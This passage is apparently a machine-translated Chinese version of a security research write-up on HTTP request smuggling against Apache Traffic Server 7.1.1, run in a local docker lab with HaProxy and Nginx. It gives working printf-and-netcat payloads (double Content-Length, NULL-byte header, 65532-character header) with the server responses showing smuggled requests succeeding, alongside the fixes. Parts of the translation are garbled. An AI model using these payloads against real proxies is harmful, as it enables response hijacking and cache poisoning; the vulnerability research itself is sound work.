+ C， docker-compose up将删除所有缓存）。
### 请求按双重内容长度拆分
让我们开始一个真实的游戏。 那就是HTTP走私的101。 简单的向量。 RFC 7230 3.3.3（加粗）严格禁止对Double-Content-Length标头的支持：
> 4如果接收到的消息没有传输编码，并且具有不同字段值的多个Content-Length头字段或具有无效值的单个Content-> Length头字段，则消息帧无效，并且接收者必须将其视为 不可恢复的错误。 如果这是一个请求消息，则服务器必须以400状态码响应，然后关闭连接。
> 如果这是代理收到的响应消息，则代理必须关闭与服务器的连接，丢弃收到的响应，并向客户端发送502（错误网关）响应。
> 如果这是用户代理收到的响应消息，则用户代理必须关闭与服务器的连接并丢弃收到的响应。
基于Content-Length标头的顺序对消息长度的不同解释是首次证明的HTTP smuggling攻击（2005年）。
直接在ATS上发送这样的查询会生成2个响应（一个400和一个200）：
    printf 'GET /index.html?toto=1 HTTP/1.1\r\n'\
    'Host: dummy-host7.example.com\r\n'\
    'Content-Length: 0\r\n'\
    'Content-Length: 66\r\n'\
    '\r\n'\
    'GET /index.html?toto=2 HTTP/1.1\r\n'\
    'Host: dummy-host7.example.com\r\n'\
    '\r\n'\
    |nc -q 1 127.0.0.1 8007
常规响应应该是一个错误400。
使用端口8001（HaProxy）无效，HaProxy是一个强大的HTTP代理，不能被这种简单的技巧所欺骗。
这是经典的“关键请求拆分”，但是如果在反向代理链上使用一些强大的工具，则很难在现实环境中重现。那么，为什么关键？因为您还可能认为ATS健壮，并在ATS之前或之后使用新的未知HTTP服务器，并期望可以正确检测到这种smuggling攻击。
还有另一个关键因素，HTTP解析中的任何其他问题都可以利用此Double Content-Length。假设还有另一个问题，该问题使我们可以为所有其他HTTP
actor隐藏一个标头，但将此标头显示给ATS。然后，我们只需要将此隐藏的标头用于第二个Content-length，就可以完成操作，而不会被先前的actor阻止。在我们当前的情况下，ATS，您有一个带有“ space-before-：”这样的隐藏标题问题的示例，我们将在后面进行分析。
### 通过NULL字符注入请求
这个示例不容易理解，这也不是最大的影响，因为我们将使用一个非常糟糕的查询进行攻击，很容易检测到。 但是我喜欢神奇的NULL(\ 0)字符。
在标头中使用NULL字节字符会触发对ATS的查询拒绝，这是可以的，但也会提前结束查询，如果在出现第一个错误后没有关闭管道，则可能会发生不良情况。
下一行解释为管道中的下一个查询。
因此，像这样的有效管道：
    01 GET /does-not-exists.html?foofoo=1 HTTP/1.1\r\n
     02 X-Something: \0 something\r\n
     03 X-Foo: Bar\r\n
     04 \r\n
     05 GET /index.html?bar=1 HTTP/1.1\r\n
     06 Host: dummy-host7.example.com\r\n
     07 \r\n
生成2错误400。因为第二个查询以X-Foo开头：Bar \ r \ n，所以这是无效的第一条查询行。
让我们测试一个无效的管道（因为两个查询之间没有\ r \ n）：
    01 GET /does-not-exists.html?foofoo=2 HTTP/1.1\r\n
     02 X-Something: \0 something\r\n
     03 GET /index.html?bar=2 HTTP/1.1\r\n
     04 Host: dummy-host7.example.com\r\n
     05 \r\n
它生成1个错误400和1个200 OK响应。 第03/04/05行被视为有效查询。
这已经是HTTP请求攻击。
但是03行是一个不太完美的标题行，大多数代理程序都会拒绝。然而不能将其视为有效的唯一查询。
伪造的管道将作为错误查询而被早期检测到，我的意思是第03行显然不是有效的标头行。
    GET /index.html?bar=2 HTTP/1.1\r\n
     !=
    [:][SP][CR][LF]
对于第一行，语法是以下两行之一：
    [SP][SP]HTTP/[M].[m][CR][LF]
    [SP][SP]HTTP/[M].[m][CR][LF] (absolute uri)
`LOCATION`可以用于插入标头行中所需的特殊[:]，特别是在查询字符串部分，但这会在HEADER-NAME-NO-SPACE部分中注入很多不良字符，例如'/' 或者 '？'。
让我们尝试使用ABSOLUTE-URI替代语法，其中[:]在行上的显示速度更快，并且Header名称唯一的错误字符是空格。
这也将修复双主机标头的潜在存在（绝对uri会替换主机标头）。
    01 GET /does-not-exists.html?foofoo=2 HTTP/1.1\r\n
     02 Host: dummy-host7.example.com\r\n
     03 X-Something: \0 something\r\n
     04 GET http://dummy-host7.example.com/index.html?bar=2 HTTP/1.1\r\n
     05 \r\n
在这里，成为查询的错误标头是第04行，标头名称是GET http，标头值为`//dummy-host7.example.com/index.html?bar=2 HTTP / 1.1`。
那仍然是无效的标头（标头名称包含空格），但我很确定我们可以找到一些HTTP代理来传输此标头（ATS证明了这一点，标头名称中允许使用空格字符）。
使用此技巧的实际攻击将如下所示：
    printf 'GET /something.html?zorg=1 HTTP/1.1\r\n'\
    'Host: dummy-host7.example.com\r\n'\
    'X-Something: "\0something"\r\n'\
    'GET http://dummy-host7.example.com/index.html?replacing=1&zorg=2 HTTP/1.1\r\n'\
    '\r\n'\
    'GET /targeted.html?replaced=maybe&zorg=3 HTTP/1.1\r\n'\
    'Host: dummy-host7.example.com\r\n'\
    '\r\n'\
    |nc -q 1 127.0.0.1 8007
这只是2个查询（第一个查询有2个错误的标头，一个标有NULL，一个标头名称中有一个空格），对于ATS，它是3个查询。
常规的第二个（/targeted.html)将获得隐藏查询的响应（`http://dummy-host.example.com/index.html?replacing=1&zorg=2`）。 检查`X-Location-echo:`由Nginx添加。 之后，ATS添加了一个thirsr响应，即404，但是前一个参与者仅期望2个响应，而第二个响应已被替换。
    HTTP/1.1 400 Invalid HTTP Request
    Date: Fri, 26 Oct 2018 15:34:53 GMT
    Connection: keep-alive
    Server: ATS/7.1.1
    Cache-Control: no-store
    Content-Type: text/html
    Content-Language: en
    Content-Length: 220
    Bad Request
    Bad Request
    Description: Could not process this request. 
之后：
    HTTP/1.1 200 OK
    Server: ATS/7.1.1
    Date: Fri, 26 Oct 2018 15:34:53 GMT
    Content-Type: text/html
    Content-Length: 120
    Last-Modified: Fri, 26 Oct 2018 14:16:28 GMT
    ETag: "5bd321bc-78"
    X-Location-echo: /index.html?replacing=1&zorg=2
    X-Default-VH: 0
    Cache-Control: public, max-age=300
    Accept-Ranges: bytes
    Age: 0
    Connection: keep-alive
    $Nginx default static page
    Hello World
    It works!
然后，额外的未使用响应：
    HTTP/1.1 404 Not Found
    Server: ATS/7.1.1
    Date: Fri, 26 Oct 2018 15:34:53 GMT
    Content-Type: text/html
    Content-Length: 153
    Age: 0
    Connection: keep-alive
    404 Not Found
    404 Not Found
    nginx/1.15.5
如果尝试使用端口8001（因此通过HaProxy进行传输），则不会获得预期的攻击结果。
    HTTP/1.0 400 Bad request
    Cache-Control: no-cache
    Connection: close
    Content-Type: text/html
    400 Bad request
    Your browser sent an invalid request.
这是HTTP请求拆分攻击，但实际使用情况可能很难找到。
ATS的解决方法是“错误时关闭”，当触发错误400时，流水线停止运行，错误发生后套接字将关闭。
### 使用标头进行请求拆分，提早结束查询
这次攻击与上一次攻击几乎相同，但是不需要神奇的NULL字符即可触发查询结束事件。
通过使用大小约为65536个字符的标头，我们可以触发此事件，并以与查询NULL提前结束的方式相同的方式利用该事件。
关于printf的注释，其中包含printf产生的巨大标头。 在这里，我使用一个包含很多重复字符（例如=或1）的标头生成查询：
`X: ==============( 65 532 '=' )========================\r\n`
我们可以在printf中使用％ns格式来生成此格式，从而生成大量空格。
但是要做到这一点，我们需要用tr替换一些特殊字符，并使用_代替原始字符串中的空格：
    printf 'X:_"%65532s"\r\n' | tr " " "=" | tr "_" " "
尝试对Nginx：
    printf 'GET_/something.html?zorg=6_HTTP/1.1\r\n'\
    'Host:_dummy-host7.example.com\r\n'\
    'X:_"%65532s"\r\n'\
    'GET_http://dummy-host7.example.com/index.html?replaced=0&cache=8_HTTP/1.1\r\n'\
    '\r\n'\
    |tr " " "1"\
    |tr "_" " "\
    |nc -q 1 127.0.0.1 8002
我发现一个错误400，那是正常现象。 Nginx不喜欢巨大的标题。
现在尝试针对ATS7：
    printf 'GET_/something.html?zorg2=5_HTTP/1.1\r\n'\
    'Host:_dummy-host7.example.com\r\n'\
    'X:_"%65534s"\r\n'\
    'GET_http://dummy-host7.example.com/index.html?replaced=0&cache=8_HTTP/1.1\r\n'\
    '\r\n'\
    |tr " " "1"\
    |tr "_" " "\
    |nc -q 1 127.0.0.1 8007
在错误400之后，我们将收到200 OK响应。 与前面的示例相同的问题，并且相同的修复程序。
在这里，我们仍然有一个查询，该查询的标头包含空格，而且标头很大，但是没有NULL字符。
但是，是的，65000个字符非常大，大多数参与者会在一行中输入8000个字符后拒绝查询。
    HTTP/1.1 400 Invalid HTTP Request
    Date: Fri, 26 Oct 2018 15:40:17 GMT
    Connection: keep-alive
    Server: ATS/7.1.1
    Cache-Control: no-store
    Content-Type: text/html
    Content-Language: en
    Content-Length: 220
    Bad Request
    Bad Request
    Description: Could not process this request. 
    HTTP/1.1 200 OK
    Server: ATS/7.1.1
    Date: Fri, 26 Oct 2018 15:40:17 GMT
    Content-Type: text/html
    Content-Length: 120
    Last-Modified: Fri, 26 Oct 2018 14:16:28 GMT
    ETag: "5bd321bc-78"
    X-Location-echo: /index.html?replaced=0&cache=8
    X-Default-VH: 0
    Cache-Control: public, max-age=300
    Accept-Ranges: bytes
    Age: 0
    Connection: keep-alive